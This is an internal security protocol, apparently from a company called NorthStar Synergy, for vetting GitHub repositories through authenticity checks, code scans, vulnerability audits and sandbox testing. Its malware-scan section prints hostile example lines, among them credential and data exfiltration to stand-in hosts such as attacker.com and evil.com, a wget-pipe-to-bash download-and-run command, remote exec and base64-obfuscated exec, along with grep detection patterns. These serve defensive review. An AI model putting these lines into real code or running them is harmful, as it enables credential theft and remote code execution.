# GITHUB SECURITY PROTOCOL — NorthStar Synergy
**Status:** Active | **Version:** 1.0 | **Last Updated:** 2026-02-25

---

## CORE PRINCIPLE

**GitHub repositories are UNTRUSTED SOURCES by default.**

Never assume code is safe just because:
- It has many stars
- It's well-documented
- It claims to be "open-source"
- It looks legitimate

**All code from GitHub must be audited before use in production.**

---

## MULTI-LAYER SECURITY VETTING

### Layer 1: Repository Authenticity (5 min)

**Question:** Is this the REAL official repo?

**Checks:**
- ✅ Is it under the official organization/author account? (e.g., `camoufox.com` links to `daijro/camoufox`)
- ✅ GitHub stars: >500 (established projects) or <50 (new/niche, risky)
- ✅ Commit history: Recent commits (within 3 months) = maintained
- ✅ Contributors: Multiple contributors (not solo dev) = lower risk
- ✅ License: Standard license (MIT, Apache, GPL) = transparent intent
- ✅ README: Professional, clear, realistic (not salesy or vague)

**Red Flags:**
- ❌ Repo just created (<1 week old)
- ❌ Only 1-2 stars (probably not tested)
- ❌ No commits in 6+ months (abandoned = unpatched vulnerabilities)
- ❌ Unknown/fake author name
- ❌ No license (could hide malicious intent)
- ❌ README doesn't explain what it actually does

**Action:** If ANY red flag → SKIP THIS REPO

---

### Layer 2: Code Malware Scan (20 min)

**Question:** Does the code try to steal credentials, exfiltrate data, or install persistence?

**What to look for:**

**Credential Theft:**
```python
# ❌ BAD - stealing credentials
requests.get("http://attacker.com/?token=" + api_key)
os.environ['AWS_SECRET'] sent to remote server
subprocess.call(["curl", "http://evil.com/?pwd=" + password])
```

**Data Exfiltration:**
```python
# ❌ BAD - sending data to remote server
import requests
requests.post("http://attacker.com/log", json=all_requests)
socket.create_connection(("attacker.com", 9999))
```

**Persistence/Backdoors:**
```python
# ❌ BAD - installing hidden components
os.system("wget http://evil.com/malware.sh | bash")
exec(requests.get("http://evil.com/code").text)  # Remote code execution
hidden_cron_job_created = True
```

**Obfuscation (RED FLAG):**
```python
# ❌ BAD - intentionally obscuring code
exec(__import__('base64').b64decode('..obscured...'))
__import__('marshal').loads(...)  # Binary bytecode
lambda x: eval(str(x))  # Late evaluation
```

**Suspicious Patterns:**
```python
# ⚠️ CAUTION - might be legitimate, but verify context
import ctypes
subprocess.call  # Running system commands
urllib.urlopen  # Making web requests
pickle.loads  # Deserializing untrusted data
```

**Method:**
1. Clone repo to LOCAL machine (don't run yet)
2. Search for suspicious keywords: `requests.post`, `eval`, `exec`, `subprocess`, `socket`, `base64`, `marshal`
3. For each hit: READ THE CONTEXT
   - Is it legitimate use? (e.g., subprocess for intended feature)
   - Or is it stealing data? (e.g., sending to unknown domain)
4. Check `setup.py` and `requirements.txt` (dependencies could be malicious)

**Tool:** Use `grep` or IDE search (NOT running the code)

```bash
# Search for suspicious patterns
grep -r "requests\\.post\|urllib\|exec\|eval" --include="*.py" .
grep -r "subprocess\|socket\|base64\\.b64decode" --include="*.py" .
```

**Action:** If suspicious code found → REJECT REPO or contact maintainer

---

### Layer 3: Vulnerability Audit (10 min)

**Question:** Are there known security vulnerabilities?

**Checks:**

**GitHub Security Advisory:**
- Go to repo → Security tab → Check advisories
- Any HIGH/CRITICAL? → Don't use until patched

**Dependency Vulnerabilities:**
```bash
# For Python projects
pip install safety
safety check requirements.txt

# For Node/npm projects
npm audit
npm audit fix (to auto-patch if safe)

# For all languages
# Check: https://nvd.nist.gov/vuln/search
```

**Version Pinning:**
- ❌ BAD: `pip install curl_cffi` (latest, could auto-update with vulnerabilities)
- ✅ GOOD: `pip install curl_cffi==0.5.9` (specific version, audited)

**Action:** 
- If HIGH/CRITICAL vulnerabilities: Don't use
- If LOW/MEDIUM: Document and require security patches
- Always pin versions (never use `>=` or `latest`)

---

### Layer 4: Isolated Testing (30 min)

**Question:** Does it actually behave as advertised (and only that)?

**Setup:**
1. Create isolated VM or Docker container
2. Never use real credentials (use fake test credentials)
3. Monitor network activity while running

**Monitoring:**
```bash
# On Linux/Mac:
tcpdump -i any -w traffic.pcap  # Capture all network traffic

# On Windows:
netsh trace start capture=yes tracefile=traffic.etl
```

**Test Case:**
```python
# Test with FAKE credentials
fake_creds = {
    "username": "test@example.com",
    "password": "fake_password_12345",
    "api_key": "sk_test_fake_key_123456789"
}

# Run the tool
result = camoufox.launch(proxy="http://fake:fake@localhost:8888")

# Questions:
# - Did it try to connect to unknown domains?
# - Did it exfiltrate the fake credentials?
# - Did it install anything unexpected?
```

**Action:**
- Any suspicious network traffic → REJECT REPO
- Any credential leakage → REJECT REPO
- If clean: Proceed to Layer 5

---

### Layer 5: Production Deployment (Ongoing)

**Requirements before going live:**

- [ ] All 4 layers completed
- [ ] Dependencies patched (security advisory cleared)
- [ ] Tested in sandbox (no exfiltration)
- [ ] Network monitoring enabled (ongoing)
- [ ] Least-privilege deployment (minimal permissions)
- [ ] Audit logging enabled (log all actions)
- [ ] Incident response plan in place

---

## LIBRARY-SPECIFIC CHECKS

### Python Projects

```bash
# Check for suspicious imports
grep -r "import requests\|import socket\|import subprocess" --include="*.py" .

# Check setup.py for malicious setup
cat setup.py | grep -i "post_install\|pre_install\|os.system"

# Dependency audit
pip install pipdeptree
pipdeptree  # Show all dependency tree

pip install safety
safety check requirements.txt
```

### Node/npm Projects

```bash
# Check package.json for sketchy dependencies
cat package.json | grep -i "dependencies\|devDependencies"

# Audit dependencies
npm audit

# Check for malicious postinstall scripts
cat package.json | grep -i "postinstall\|preinstall"

# Dependency audit
npm ls  # Show all dependencies
```

### Browser Extensions (Chrome/Firefox)

```
❌ NEVER install extensions from GitHub directly
✅ ONLY install from official app stores (Chrome Web Store, Firefox Add-ons)

Why: Extensions have access to all your data, can't easily audit compiled code
```

---

## RED FLAGS (Automatic REJECT)

If **ANY** of these apply → Do NOT use repo:

- ❌ Repo created <1 week ago (no track record)
- ❌ 0 stars (untested by community)
- ❌ No commits in 12+ months (abandoned, unpatched)
- ❌ Code obfuscation (base64, marshal, eval)
- ❌ Hardcoded URLs to unknown domains
- ❌ Sends data to attacker's server
- ❌ HIGH or CRITICAL vulnerabilities
- ❌ No license (closed-source intent hidden)
- ❌ Author name doesn't match organization
- ❌ Suspicious postinstall/setup scripts
- ❌ Exfiltrates environment variables or credentials

---

## APPROVED REPOSITORIES (For NorthStar)

Repos that have passed all 5 layers:

| Repo | Status | Audited | Vulnerabilities | Last Check |
|------|--------|---------|---|---|
| daijro/camoufox | 🟡 CAUTION | ❌ Pending | TBD | Pending |
| lexiforest/curl_cffi | 🟡 CAUTION | ❌ Pending | TBD | Pending |
| (others as tested) | | | | |

---

## SECURITY CHECKLIST (Before Any Deployment)

Use this checklist every time code is introduced:

- [ ] **Authenticity:** Verified official repo, multiple stars/contributors, active maintenance
- [ ] **Code audit:** No credential theft, data exfiltration, or malware detected
- [ ] **Vulnerabilities:** All known CVEs patched, `npm audit` / `safety check` clean
- [ ] **Testing:** Ran in isolated sandbox with fake credentials, no suspicious traffic
- [ ] **Version pinning:** Dependencies locked to specific versions (not `>=latest`)
- [ ] **Permissions:** Tool has minimal required permissions (not root/admin)
- [ ] **Monitoring:** Network traffic monitoring enabled during use
- [ ] **Documentation:** Security assessment documented in comments/wiki

---

## INCIDENT RESPONSE (If Compromised)

If code is discovered to be malicious AFTER deployment:

1. **IMMEDIATELY** revoke all related credentials
   - API keys
   - Database passwords
   - SSH keys
   - Any tokens used by the tool

2. **Isolate** affected systems
   - Disconnect from network (if applicable)
   - Stop all processes using the code

3. **Audit** for exfiltration
   - Check network logs (where did data go?)
   - Check file system (what was written?)
   - Check environment variables (what credentials were exposed?)

4. **Notify** stakeholders
   - Craig (immediately)
   - Any affected services
   - Rotate credentials proactively

5. **Remove** compromised code
   - Delete from repository
   - Delete from all deployments
   - Blacklist repo (don't use again)

6. **Document** incident
   - Add to `memory/security_log.md`
   - Root cause analysis
   - Lessons learned

---

## SUMMARY

**GitHub Code = Untrusted by default**

**5-Layer Security Vetting Required:**
1. Repository Authenticity (5 min)
2. Code Malware Scan (20 min)
3. Vulnerability Audit (10 min)
4. Isolated Testing (30 min)
5. Production Deployment (with monitoring)

**Total Time:** ~1 hour per major library

**Cost:** 1 hour + monitoring = saves thousands if malware prevented

---

**This protocol applies to ALL external code.**

No exceptions. No shortcuts.

---

**Protocol Owner:** Cliff (NorthStar Security Officer)  
**Last Updated:** 2026-02-25  
**Effective:** Immediately
